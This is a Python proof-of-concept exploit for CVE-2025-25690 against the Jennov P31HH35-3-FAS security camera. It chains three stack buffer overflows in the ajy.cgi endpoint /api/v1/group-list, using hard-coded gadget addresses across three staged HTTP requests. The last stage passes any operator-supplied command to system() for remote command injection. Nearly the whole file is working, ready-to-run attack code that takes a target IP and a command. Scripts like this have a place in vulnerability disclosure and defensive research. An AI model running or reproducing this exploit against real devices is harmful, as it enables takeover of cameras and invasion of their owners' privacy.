'''
Jennov_P31HH35-3-FAS_PoC.py

Author: Evan Ritz

CVE(s): CVE-2025-25690

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH REGARD TO THIS 
SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE 
AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES 
WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, 
NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE
OF THIS SOFTWARE.

This PoC targets the Jennov P31 P31HH35-3-FAS Wireless Security Camera.
 - (This camera is no longer sold on https://jennovshop.com)

This PoC exploits 3 stack-based buffer overflows in a CGI application (ajy.cgi) that serves
the endpoint /api/v1/group-list to perform a remote command injection.

This PoC enables debugging code left within ajy.cgi by the developer (Jennov). Once enabled, user 
input (such as a command) is stored within a global debug buffer that is then fed to the system 
function to trigger a command injection.

Working on Firmware Version: 01.10100.10.50 (Latest as of 01-18-2025)

PoC can work on older firmware versions, but may require offsets to be slightly changed

Limitation: For this PoC to work, the targeted device MUST have an SD card installed.

'''

import argparse
import requests
from time import sleep

VULNERABLE_ENDPOINT = '/api/v1/group-list'
REG_SIZE_IN_BYTES = 4

def isWebServerExposed():
    '''
    Determine if the webserver is up
    '''
    try:
        _ = requests.get(f'http://{IP_ADDRESS}:80/', timeout=10)
        return True
    except requests.exceptions.Timeout:
        return False

def isSdCardInstalled():
    '''
    Determine if the device has a SD card installed
    '''
    test_file = '.test_w'
    try:
        response = requests.get(f'http://{IP_ADDRESS}:80/{test_file}', timeout=10)
        return response.status_code == 200
    except requests.exceptions.Timeout:
        return False

def stage1():
    '''
    Create web_debug.log 
    '''
    # ip_address overflow from "proxy" HTTP parameter
    # need this to cause crash of ajy.cgi
    IP_ADDRESS_OVERFLOW_SIZE =  0x270
    IP_ADDRESS_OVERFLOW_SIZE += 0x34

    ip_address_data =  'I' * IP_ADDRESS_OVERFLOW_SIZE
    ip_address_data += 'junk'

    # device_id overflow from "deviceId" JSON request body data
    ADDRESS_OF_SAVE_TO_FILE_GADGET = b'\xd8\x15\x40' # 0x004015d8

    DEVICE_ID_OVERFLOW_SIZE =  0x170
    DEVICE_ID_OVERFLOW_SIZE -= 1 * REG_SIZE_IN_BYTES

    device_id_data =  b'D' * DEVICE_ID_OVERFLOW_SIZE
    device_id_data += ADDRESS_OF_SAVE_TO_FILE_GADGET # $ra

    # access_key overflow from "accessKey" JSON request body data
    ADDRESS_OF_STRING = b'\xc8\x7d\x40' # 0x00407dc8

    ACCESS_KEY_OVERFLOW_SIZE =  0xf0
    ACCESS_KEY_OVERFLOW_SIZE -= 7 * REG_SIZE_IN_BYTES

    access_key_data =  b'A' * ACCESS_KEY_OVERFLOW_SIZE
    access_key_data += ADDRESS_OF_STRING # $s0

    # build url
    url = f'http://{IP_ADDRESS}:80{VULNERABLE_ENDPOINT}?proxy={ip_address_data}:0&'

    # build JSON request body
    request_body_data =  b'{\"data\": {\"deviceId\": \"'
    request_body_data += device_id_data
    request_body_data += b'\", \"accessKey\": \"'
    request_body_data += access_key_data
    request_body_data += b'\"}}'

    request_body_data_len = len(request_body_data)

    # attempt Stage 1
    try:
        _ = requests.post(
            url,
            data=request_body_data,
            headers={'Content-Length': f'{request_body_data_len}'},
            timeout=10
        )
        return True
    except requests.exceptions.Timeout:
        return False

def didStage1Succeed():
    '''
    Ensure web_debug.log exists
    '''
    web_debug_log_file = 'web_debug.log'
    try:
        response = requests.get(f'http://{IP_ADDRESS}:80/{web_debug_log_file}', timeout=10)
        return response.status_code == 200
    except requests.exceptions.Timeout:
        return False

def stage2():
    '''
    Rename web_debug.log to cgiDebug
    '''
    # ip_address overflow from "proxy" HTTP parameter
    web_debug_log_file = '/mnt/mmc/web_debug.log'

    IP_ADDRESS_OVERFLOW_SIZE =  0x270
    IP_ADDRESS_OVERFLOW_SIZE += 0x120

    ip_address_data =  'I' * IP_ADDRESS_OVERFLOW_SIZE
    ip_address_data += web_debug_log_file

    # device_id overflow from "deviceId" JSON request body data
    cgi_debug_file = '/mnt/mmc/cgiDebug'

    DEVICE_ID_OVERFLOW_SIZE =  0x170
    DEVICE_ID_OVERFLOW_SIZE += 0x20

    device_id_data =  b'D' * DEVICE_ID_OVERFLOW_SIZE
    device_id_data += cgi_debug_file.encode()

    # access_key overflow from "accessKey" JSON request body data
    ADDRESS_OF_RENAME_GADGET = b'\x68\x29\x40' # 0x00402968

    ACCESS_KEY_OVERFLOW_SIZE =  0xf0
    ACCESS_KEY_OVERFLOW_SIZE -= 1 * REG_SIZE_IN_BYTES

    access_key_data =  b'A' * ACCESS_KEY_OVERFLOW_SIZE
    access_key_data += ADDRESS_OF_RENAME_GADGET # $ra

    # build url
    url = f'http://{IP_ADDRESS}:80{VULNERABLE_ENDPOINT}?proxy={ip_address_data}:0&'

    # build JSON request body
    request_body_data =  b'{\"data\": {\"deviceId\": \"'
    request_body_data += device_id_data
    request_body_data += b'\", \"accessKey\": \"'
    request_body_data += access_key_data
    request_body_data += b'\"}}'

    request_body_data_len = len(request_body_data)

    # attempt Stage 2
    try:
        _ = requests.post(
            url,
            data=request_body_data,
            headers={'Content-Length': f'{request_body_data_len}'},
            timeout=10
        )
        return True
    except requests.exceptions.Timeout:
        return False

def didStage2Succeed():
    '''
    Ensure cgiDebug exists
    '''
    cgi_debug_file = 'cgiDebug'
    try:
        response = requests.get(f'http://{IP_ADDRESS}:80/{cgi_debug_file}', timeout=10)
        return response.status_code == 200
    except requests.exceptions.Timeout:
        return False

def stage3():
    '''
    Perform command injection
    '''
    # device_id overflow from "deviceId" JSON request body data
    ADDRESS_OF_SYSTEM_GADGET = b'\x94\x41\x40' # 0x00404194

    DEVICE_ID_OVERFLOW_SIZE =  0x170
    DEVICE_ID_OVERFLOW_SIZE -= 1 * REG_SIZE_IN_BYTES

    device_id_data =  b'D' * DEVICE_ID_OVERFLOW_SIZE
    device_id_data += ADDRESS_OF_SYSTEM_GADGET # $ra

    # access_key overflow from "accessKey" JSON request body data
    command = COMMAND + ';#'
    command = command.encode()
    command_len = len(command)

    ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER = 0x4191b0
    # static junk: "000 QryGroupList Error DeviceSn:<16 character Device Serial Number>--"
    ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER += 50
    # Since device_id overflows into access_key and removes NULL terminator, the command can be stored in access_key
    ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER += 0x170
    ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER -= 7 * REG_SIZE_IN_BYTES # $s0 - $s5 and $ra
    ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER -= command_len
    ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER = ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER.to_bytes(3, 'little') 

    ACCESS_KEY_OVERFLOW_SIZE =  0xf0
    ACCESS_KEY_OVERFLOW_SIZE -= 7 * REG_SIZE_IN_BYTES
    ACCESS_KEY_OVERFLOW_SIZE -= command_len

    access_key_data =  b'A' * ACCESS_KEY_OVERFLOW_SIZE
    access_key_data += command
    access_key_data += b'S' * 4 * REG_SIZE_IN_BYTES # s0 - s3
    access_key_data += ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER # $s4

    # build url
    url = f'http://{IP_ADDRESS}:80{VULNERABLE_ENDPOINT}'

    # build JSON request body
    request_body_data =  b'{\"data\": {\"deviceId\": \"'
    request_body_data += device_id_data
    request_body_data += b'\", \"accessKey\": \"'
    request_body_data += access_key_data
    request_body_data += b'\"}}'

    request_body_data_len = len(request_body_data)

    # attempt Stage 3
    try:
        _ = requests.post(
            url,
            data=request_body_data,
            headers={'Content-Length': f'{request_body_data_len}'},
            timeout=10
        )
        return True
    except requests.exceptions.Timeout:
        # Some commands may cause the CGI application to not respond
        return True

def main():

    print('[*] Attempting command injection on Jennov P31 P31HH35-3-FAS Wireless Security Camera...')
    
    print('[~] Determining if webserver is up... ', end='')
    assert(isWebServerExposed())
    print('YES!')

    sleep(1)

    '''
    This only works if the SD card was formatted by the camera
    '''
    # print('[~] Determining if device has SD card installed... ', end='')
    # assert(isSdCardInstalled())
    # print('YES!')

    # sleep(1)

    print('[*] Performing Stage 1 (Creating web_debug.log)...')
    assert(stage1())

    sleep(1)

    print('[~] Determining if Stage 1 succeeded... ', end='')
    assert(didStage1Succeed())
    print('YES!')

    sleep(1)

    print('[*] Performing Stage 2 (Renaming web_debug.log to cgiDebug)...')
    assert(stage2())

    sleep(1)

    print('[~] Determining if Stage 2 succeeded... ', end='')
    assert(didStage2Succeed())
    print('YES!')

    sleep(1)

    print(f'[*] Performing Stage 3 (Command Injection)... Command={COMMAND}')
    assert(stage3())

    print('[!] Hopefully pwned...???!!!')

if __name__ == '__main__':
    # argument parsing
    parser = argparse.ArgumentParser(prog='Jennov_P31HH35-3-FAS_PoC.py')
    parser.add_argument(
        '-i', '--ip-address', 
        required=True, 
        help='Target ip address - Example: 192.168.0.1'
    )
    parser.add_argument(
        '-c', '--command',
        required=True,
        help='Command to execute on target - Example: /sbin/reboot'
    )

    args = parser.parse_args()
    IP_ADDRESS = args.ip_address
    COMMAND = args.command

    main()
